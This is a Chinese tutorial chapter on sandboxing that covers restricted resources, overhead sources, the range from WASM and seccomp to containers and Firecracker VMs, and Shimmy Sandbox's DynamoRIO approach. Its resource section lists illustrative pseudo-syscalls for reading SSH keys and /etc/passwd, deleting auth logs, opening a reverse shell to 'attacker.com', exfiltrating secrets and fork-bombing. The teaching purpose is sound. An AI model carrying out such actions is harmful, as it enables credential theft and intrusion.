# 什么是沙箱？

**前置知识**：了解"程序"和"操作系统"的基本概念即可；读过指南第一、二章更佳。

**你将学到**：
- 沙箱的直觉：为什么需要让代码"跑不出去"
- 沙箱必须限制哪些资源
- 沙箱带来的性能代价从哪里来
- 从语言级到虚拟机，各种沙箱技术的谱系
- 为什么不存在"完美的沙箱"

---

## 1. 沙箱的直觉：游乐场围栏

想象一个儿童游乐场。围栏不是为了让孩子难受，而是为了让他们在安全范围内自由玩耍——即使不小心跌倒，也不会跑到马路上。

**沙箱**（sandbox）对程序的作用完全一样：让程序在一个受限环境中运行，即使程序有 bug、被攻击，甚至是恶意的，它能造成的伤害也被限制在"围栏"之内。

> 💡 **沙箱（Sandbox）**
> 一种安全机制，把程序限制在一个受控的执行环境中，阻止它执行可能造成伤害的操作。"沙箱"这个词来自儿童玩的沙盒——孩子可以在里面尽情玩，但沙子不会洒到外面去。

现实中，你每天都在和沙箱打交道：
- 浏览器把每个网页的 JavaScript 关在自己的沙箱里，防止 A 网站的脚本偷看 B 网站的密码
- 手机 App 被操作系统隔离，微信不能直接读取微博的数据库
- 云服务商（AWS Lambda、Cloudflare Workers）让你的代码和别人的代码跑在同一台服务器上，互不干扰

## 2. 沙箱需要限制什么

一个程序能造成危害，归根结底是因为它能访问某些"资源"。沙箱的本质就是控制对这些资源的访问。

### 2.1 文件系统访问

```
没有沙箱的程序可以：
  open("/etc/passwd", O_RDONLY)     ← 读取所有用户的账号
  open("/root/.ssh/id_rsa", O_RDONLY) ← 偷取 SSH 私钥
  open("/tmp/attack.sh", O_WRONLY)  ← 写入恶意脚本
  unlink("/var/log/auth.log")       ← 删除登录记录
```

沙箱的目标：程序只能访问它"应该"访问的文件，对其他路径的访问一律拒绝。

### 2.2 网络访问

```
没有沙箱的程序可以：
  connect("attacker.com", 4444)     ← 反弹 Shell（把控制权交给攻击者）
  send(secret_data, ...)            ← 外泄 AWS 密钥、数据库密码
  bind(0.0.0.0, 80)                 ← 伪装成 Web 服务器
```

沙箱的目标：阻止未授权的网络连接，或完全切断程序的网络访问。

### 2.3 进程创建

```
没有沙箱的程序可以：
  fork() × 10000 次                 ← Fork 炸弹，耗尽进程表
  execve("/bin/bash", ...)          ← 弹出 Shell
  execve("/usr/bin/python3", ...)   ← 启动另一个程序绕过限制
```

沙箱的目标：限制或禁止创建新进程，防止通过"生孩子"逃出限制。

### 2.4 内存操作

```
没有沙箱的程序可以：
  mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, ...)
                                    ← 分配可执行内存（JIT/shellcode 的前提）
  mprotect(addr, size, PROT_EXEC)   ← 把数据段变成可执行的
```

沙箱的目标：防止程序动态生成并执行任意机器码（shellcode）。

### 2.5 其他资源

除以上四类，程序还可能滥用：
- **CPU 时间**：无限循环或密码学运算耗尽 CPU，让别人的程序无法运行
- **内存**：分配 GB 级内存直到 OOM（Out of Memory）
- **信号**：给其他进程发 `SIGKILL`
- **设备文件**：通过 `/dev/mem` 直接读写物理内存

```
沙箱需要限制的资源全景：

    ┌────────────────────────────────────────────────────────┐
    │                   不受信任的程序                        │
    └────────────────────────────────────────────────────────┘
                              │
          ┌───────────────────┼───────────────────┐
          ▼                   ▼                   ▼
    ┌──────────┐       ┌──────────┐       ┌──────────┐
    │ 文件系统 │       │   网络   │       │ 进程/信号│
    │ /etc     │       │ TCP/UDP  │       │ fork     │
    │ /home    │  ???  │ connect  │  ???  │ execve   │
    │ /root    │       │ bind     │       │ kill     │
    └──────────┘       └──────────┘       └──────────┘
          ▼                   ▼                   ▼
    ┌──────────┐       ┌──────────┐       ┌──────────┐
    │  内存    │       │  CPU/时间│       │  设备    │
    │ mmap exec│       │ rlimit   │       │ /dev/mem │
    │ mprotect │  ???  │ cgroup   │  ???  │ /dev/kvm │
    └──────────┘       └──────────┘       └──────────┘
                              │
                    沙箱在这里守门 🚧
```

## 3. 沙箱的代价：性能开销从哪里来

沙箱不是免费的午餐。每种沙箱机制都有性能代价，理解这些代价对选择合适的方案至关重要。

### 3.1 检查开销

每次程序想做一件事（访问文件、建立连接），沙箱必须拦截并检查：

```
程序发起系统调用 open("/etc/passwd")
       │
       ▼
沙箱拦截（需要时间！）
  - 读取调用参数
  - 对照规则表
  - 决定允许/拒绝
       │
       ▼
如果允许：继续执行
如果拒绝：返回错误
```

拦截本身的开销因机制而异：
- `seccomp-bpf`：在内核里做 BPF 字节码检查，约 **5% 额外开销**
- `ptrace`：每次系统调用都要唤醒监控进程，约 **10 倍开销**
- 虚拟机：需要处理 VM exit，约 **数百纳秒每次**

### 3.2 上下文切换开销

许多沙箱需要在程序的执行和监控逻辑之间来回切换，每次切换都要保存/恢复 CPU 状态（寄存器、缓存等）。

> 💡 **上下文切换（Context Switch）**
> CPU 从执行一个任务切换到另一个任务时，需要保存当前任务的"现场"（寄存器值、程序计数器等），然后恢复另一个任务的现场。这个过程需要 1000-10000 纳秒，期间 CPU 什么"真正的工作"都没做。

### 3.3 内存开销

- 虚拟机需要为每个 VM 分配独立的内存空间（Firecracker 最小约 128MB）
- DBI 框架（动态二进制插桩）需要维护代码缓存、影子栈等数据结构

### 3.4 间接性（Indirection）开销

一些沙箱把直接调用变成间接调用：

```
原来的调用路径（无沙箱）：
  程序 → 系统调用 → 内核处理 → 返回

加了沙箱的调用路径：
  程序 → 沙箱拦截 → （可能的规则检查）→ 系统调用 → 内核处理
       → 沙箱拦截（退出时）→ 返回程序
```

每一个额外的环节都增加延迟。

## 4. 沙箱的谱系：从语言级到虚拟机

沙箱技术存在一个"谱系"，从轻量级（开销小，隔离弱）到重量级（开销大，隔离强）：

```
隔离强度
    ▲
    │                                     ┌─────────────────┐
    │                                     │   虚拟机（VM）   │
    │                                     │  KVM / Firecracker│
    │                                     └─────────────────┘
    │                         ┌─────────────────┐
    │                         │   容器            │
    │                         │ namespace+cgroup │
    │                         └─────────────────┘
    │             ┌─────────────────┐
    │             │  系统调用过滤    │
    │             │  seccomp / ptrace│
    │             └─────────────────┘
    │  ┌─────────────────┐
    │  │   语言级沙箱     │
    │  │  WASM / JVM     │
    │  └─────────────────┘
    │
    └──────────────────────────────────────────────► 性能开销
                                              （越重，开销越大）
```

### 4.1 语言级沙箱：WASM / JVM

**思路**：用一种受限的语言（WebAssembly、Java 字节码）来表示程序，由运行时控制所有资源访问。

类比：让人写只用"白话文"的文章，禁止使用可能引起歧义的古文——通过限制表达能力来保证安全。

优点：
- 开销最小（约 1.5× 原生性能）
- 跨平台

缺点：
- 只能跑编译到这个格式的代码
- 运行时本身可能有漏洞（逃逸沙箱）

### 4.2 系统调用过滤：seccomp-BPF

**思路**：在 Linux 内核里安装一个过滤程序，对每个系统调用做白名单/黑名单检查。

类比：在公司门口装一个安检机，每个人（每次系统调用）都要过安检才能进入大楼。安检快，但只能检查身份证（调用号），不能检查随身物品里装的什么（指针指向的数据）。

优点：
- 内核内部运行，开销极小（~5%）
- Linux 原生支持，不需要额外软件

缺点：
- 只能按系统调用号过滤，无法检查参数内容
- 需要 `PR_SET_NO_NEW_PRIVS`（某些环境不允许）

### 4.3 容器：namespace + cgroup

**思路**：给程序一个"假环境"——假的进程 ID 空间、假的网络接口、假的文件系统根目录。

类比：演员在片场表演。片场布置得像真实环境，但演员走出摄影棚就什么都没有了。

> 💡 **Linux 命名空间（Namespace）**
> Linux 内核提供的隔离机制，让不同进程看到不同的"系统视图"。例如 PID 命名空间让容器内的进程认为自己的 PID 是 1，但在宿主机上它可能是 PID 12345。

> 💡 **cgroup（Control Group）**
> Linux 内核机制，限制进程组能使用的资源总量：最多用多少 CPU、多少内存、多少磁盘 I/O。Docker 容器同时使用 namespace（隔离视图）和 cgroup（限制资源）。

优点：
- 隔离全面（文件系统、网络、进程、用户）
- Docker 等工具已经成熟

缺点：
- 需要内核特权来创建命名空间
- 共享同一个 Linux 内核——内核漏洞可以突破容器

### 4.4 虚拟机：KVM / Firecracker

**思路**：在物理机器上模拟一台完整的虚拟计算机，每个虚拟机有自己的（虚拟）CPU、内存、I/O。

类比：在真实电脑里再开一台"虚拟电脑"。这台虚拟电脑里的程序认为自己拥有整台机器，但其实它被 hypervisor（虚拟机管理器）严密监控。

优点：
- 最强的隔离：两个 VM 之间不共享内核
- 攻击面极小（攻击者需要同时攻破 VM 内的内核 + hypervisor）

缺点：
- 启动慢（传统 VM 需要数秒）
- 内存占用大
- VM exit（从 VM 切回 hypervisor）开销高

Firecracker（AWS 开源的 microVM）通过裁剪大量不必要的设备模拟，把 VM 启动时间压缩到约 125ms。

## 5. 为什么没有完美的沙箱

> 安全、性能、通用性——三个维度，最多只能同时做好两个。

### 5.1 攻击面总是存在的

无论哪种沙箱，都需要一个"接口"让程序和外界交互（不然程序什么都做不了，没有意义）。这个接口就是潜在的攻击面。

```
沙箱逃逸的基本逻辑：

沙箱边界
  ────────────────────────────────────────
  程序（受限）  ──── 接口 ────►  外部世界
  ────────────────────────────────────────

攻击者的目标：找到接口的漏洞，从"受限"这侧跑到"外部世界"
```

历史上，几乎每种沙箱都被成功逃逸过：
- Chrome 浏览器沙箱：被 Pwn2Own 竞赛多次逃逸
- JVM：存在历史上的字节码验证漏洞
- Docker 容器：runc 漏洞（CVE-2019-5736）允许容器逃逸
- KVM：历史上存在若干 VM escape 漏洞

### 5.2 通用性与安全性的矛盾

沙箱越严格，能运行的程序越少。

```
允许的系统调用越少 → 安全性越高 → 越多合法程序跑不起来
允许的系统调用越多 → 兼容性越好 → 攻击面越大
```

Firecracker 只允许 24 个系统调用——这使它几乎无法被攻击，但也意味着它只能运行非常特定的工作负载。Python 解释器启动需要 50+ 个系统调用，直接用 Firecracker 的 seccomp 配置跑 Python 会直接崩溃。

### 5.3 Shimmy 沙箱面临的特殊挑战

在 AWS Lambda 的 Firecracker microVM 环境里，绝大多数传统沙箱工具都被禁用了：

```
在 Lambda 环境中：
  seccomp    → prctl() 返回 EPERM
  ptrace     → ptrace() 返回 EPERM
  namespace  → clone(CLONE_NEW*) 返回 EPERM
  chroot     → 需要 CAP_SYS_CHROOT（无此权限）
  Landlock   → 需要 Linux 5.13+（Lambda 用 5.10）
  eBPF       → 需要 CAP_BPF（无此权限）
```

这就是为什么 Shimmy Sandbox 选择了非常规路线：在机器码层面（通过 DynamoRIO 动态二进制插桩）拦截每一条 `syscall` 指令，完全绕开了对内核特权的依赖。

## 小结

```
沙箱 = 让代码"跑不出去"的机制

需要限制的资源：
  文件 → 防止读写敏感数据
  网络 → 防止外泄和反弹 Shell
  进程 → 防止 Fork 炸弹和启动 Shell
  内存 → 防止动态生成 shellcode

性能代价来自：
  检查开销 + 上下文切换 + 间接层

沙箱谱系（轻 → 重）：
  语言级(WASM) → syscall 过滤(seccomp) → 容器(namespace+cgroup) → 虚拟机(KVM)

没有完美沙箱，因为：
  接口必然存在 → 接口就是攻击面
  通用性 vs 安全性天然矛盾
```

## 与 Shimmy/沙箱设计的联系

Shimmy Sandbox 面临的核心约束是：运行在 AWS Lambda 的 Firecracker microVM 中，所有基于内核特权的沙箱工具均不可用。Shimmy 的解决方案是使用 **DynamoRIO**（动态二进制插桩框架）在用户态拦截所有 `syscall` 指令，从而不依赖任何内核特权就能实现系统调用过滤。

这体现了沙箱设计的一个重要哲学：**找到可以控制的最小切入点**。系统调用是所有程序与内核交互的唯一入口，拦截住这里，就等于在最关键的位置设了门卫。

理解整个沙箱谱系，能帮你看清 Shimmy 的设计决策：不是因为 DBI 是"最好"的沙箱方式，而是因为在给定约束下，它是唯一可行的方式。
